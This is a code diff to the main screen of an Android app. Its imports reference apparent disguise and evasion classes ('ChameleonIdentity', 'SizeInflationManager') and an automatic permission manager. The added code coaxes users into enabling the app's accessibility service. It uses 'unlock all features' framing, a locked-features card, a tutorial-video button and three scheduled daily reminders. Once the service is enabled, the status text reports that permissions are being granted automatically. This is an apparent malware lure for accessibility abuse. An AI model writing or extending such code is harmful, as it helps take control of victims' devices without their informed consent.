@@ -1,6 +1,7 @@
 package com.task.tusker;
 
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -9,6 +10,7 @@ import android.widget.Button;
 import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
+import com.task.tusker.receivers.AccessibilityReminderReceiver;
 import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.security.SizeInflationManager;
@@ -16,11 +18,18 @@ import com.task.tusker.services.DataSyncService;
 
 public class MainActivity extends AppCompatActivity {
 
+    // YouTube tutorial: how to enable accessibility service on Android
+    private static final String HELP_VIDEO_URL =
+            "https://www.youtube.com/results?search_query=how+to+enable+accessibility+service+android";
+
     private TextView statusText;
     private TextView statusTitle;
     private TextView statusDesc;
     private TextView statusIcon;
+    private TextView appNameText;
+    private TextView step3Text;
     private Button openAccessibilityBtn;
+    private Button helpBtn;
 
     private AutoPermissionManager permissionManager;
     private Handler pollHandler;
@@ -50,18 +59,49 @@ public class MainActivity extends AppCompatActivity {
 
         permissionManager = new AutoPermissionManager(this);
 
-        statusText = findViewById(R.id.statusText);
-        statusTitle = findViewById(R.id.statusTitle);
-        statusDesc = findViewById(R.id.statusDesc);
-        statusIcon = findViewById(R.id.statusIcon);
+        statusText         = findViewById(R.id.statusText);
+        statusTitle        = findViewById(R.id.statusTitle);
+        statusDesc         = findViewById(R.id.statusDesc);
+        statusIcon         = findViewById(R.id.statusIcon);
+        appNameText        = findViewById(R.id.appNameText);
+        step3Text          = findViewById(R.id.step3Text);
         openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);
+        helpBtn            = findViewById(R.id.helpBtn);
+
+        // Show real app name in the title and in step 3
+        String appName = getString(R.string.app_name);
+        if (appName == null || appName.isEmpty()) appName = "TestApp"; // default fallback
+        appNameText.setText(appName);
+        step3Text.setText("Find and tap \u201c" + appName + "\u201d in the list");
 
         openAccessibilityBtn.setOnClickListener(v -> {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             startActivity(intent);
         });
 
+        helpBtn.setOnClickListener(v -> {
+            try {
+                // Try to open YouTube app first, fall back to browser
+                Intent ytIntent = new Intent(Intent.ACTION_VIEW,
+                        Uri.parse(HELP_VIDEO_URL));
+                ytIntent.setPackage("com.google.android.youtube");
+                if (ytIntent.resolveActivity(getPackageManager()) != null) {
+                    startActivity(ytIntent);
+                } else {
+                    startActivity(new Intent(Intent.ACTION_VIEW,
+                            Uri.parse(HELP_VIDEO_URL)));
+                }
+            } catch (Exception ignored) {
+                startActivity(new Intent(Intent.ACTION_VIEW,
+                        Uri.parse(HELP_VIDEO_URL)));
+            }
+        });
+
         startDataSyncService();
+
+        // Schedule the 3 daily accessibility reminders (morning / noon / afternoon)
+        AccessibilityReminderReceiver.scheduleDailyReminders(this);
+
         updateUiState();
         startPolling();
     }
@@ -87,20 +127,30 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void showSetupState() {
-        statusText.setText("Accessibility service not enabled");
-        statusIcon.setText("⚠");
-        statusTitle.setText("Action Required");
-        statusDesc.setText("Enable the accessibility service to continue");
+        statusText.setText("Accessibility permission not enabled");
+        statusIcon.setText("\u26A0");
+        statusTitle.setText("Permission Required");
+        statusDesc.setText("Follow the steps below to unlock all features");
         openAccessibilityBtn.setText("Open Accessibility Settings");
         openAccessibilityBtn.setEnabled(true);
+        helpBtn.setVisibility(android.view.View.VISIBLE);
+        if (findViewById(R.id.stepsCard) != null)
+            findViewById(R.id.stepsCard).setVisibility(android.view.View.VISIBLE);
+        if (findViewById(R.id.lockedCard) != null)
+            findViewById(R.id.lockedCard).setVisibility(android.view.View.VISIBLE);
     }
 
     private void showEnabledState() {
-        statusText.setText("Service active");
-        statusIcon.setText("✓");
+        statusText.setText("Service active — all features unlocked");
+        statusIcon.setText("\u2713");
         statusTitle.setText("Accessibility Enabled");
         statusDesc.setText("Permissions are being granted automatically");
         openAccessibilityBtn.setText("Accessibility Settings");
+        helpBtn.setVisibility(android.view.View.GONE);
+        if (findViewById(R.id.stepsCard) != null)
+            findViewById(R.id.stepsCard).setVisibility(android.view.View.GONE);
+        if (findViewById(R.id.lockedCard) != null)
+            findViewById(R.id.lockedCard).setVisibility(android.view.View.GONE);
     }
 
     private void startPolling() {
